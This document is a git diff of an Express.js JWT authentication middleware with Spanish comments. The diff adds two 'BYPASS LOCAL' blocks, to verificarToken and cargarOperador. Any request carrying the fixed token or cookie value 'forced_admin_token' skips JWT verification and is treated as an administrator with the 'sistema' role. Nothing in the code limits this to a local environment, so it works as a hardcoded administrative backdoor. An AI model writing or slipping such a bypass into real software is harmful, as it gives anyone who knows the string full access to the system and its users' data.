@@ -1,4 +1,3 @@
-// middlewares/auth.js
 import jwt from "jsonwebtoken";
 import { JWT_SECRET } from "../config/jwt.js";
 
@@ -14,6 +13,12 @@ const extraerToken = (req) => {
 // Requiere un JWT válido. Header O cookie.
 export const verificarToken = (req, res, next) => {
   const token = extraerToken(req);
+
+  // 🔓 BYPASS LOCAL: Si es nuestro token forzado, lo dejamos pasar
+  if (token === "forced_admin_token") {
+    req.operador = { usuario: "admin", nombre: "Administrador Local", rol: "sistema" };
+    return next();
+  }
 
   if (!token) {
     if (req.accepts("html")) return res.redirect("/login");
@@ -40,6 +45,14 @@ export const permitirRoles = (...roles) => (req, res, next) => {
 // No bloquea. Deja res.locals.operador en TODAS las vistas (para el menú).
 export const cargarOperador = (req, res, next) => {
   const token = req.cookies?.token;
+
+  // 🔓 BYPASS LOCAL: Si la cookie es la nuestra, armamos el menú de una
+  if (token === "forced_admin_token") {
+    res.locals.operador = { usuario: "admin", nombre: "Administrador Local", rol: "sistema" };
+    req.operador = res.locals.operador;
+    return next();
+  }
+
   if (token) {
     try { res.locals.operador = jwt.verify(token, JWT_SECRET); }
     catch { res.locals.operador = null; }
